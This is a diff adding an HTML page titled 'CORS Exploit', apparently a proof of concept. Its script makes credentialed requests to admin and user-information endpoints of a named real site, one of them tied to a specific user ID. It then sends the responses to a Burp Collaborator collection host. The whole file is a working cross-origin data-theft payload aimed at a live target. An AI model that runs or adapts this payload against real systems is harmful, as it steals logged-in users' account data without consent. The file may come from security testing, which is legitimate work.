@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Log the response data to Burp Collaborator
+                fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + xhr.responseText);
+            }
+        };
+        xhr.open('GET', 'https://csboss.okex.org/newboss/home', true); // Target URL 1
+        xhr.withCredentials = true; // Include cookies in the request
+        xhr.send();
+
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716', true); // Target URL 2
+        req.withCredentials = true; // Include cookies in the request
+        req.send();
+
+        function reqListener() {
+            // Log the response data to Burp Collaborator
+            fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + this.responseText);
+        };
+    </script>
+</body>
+</html>
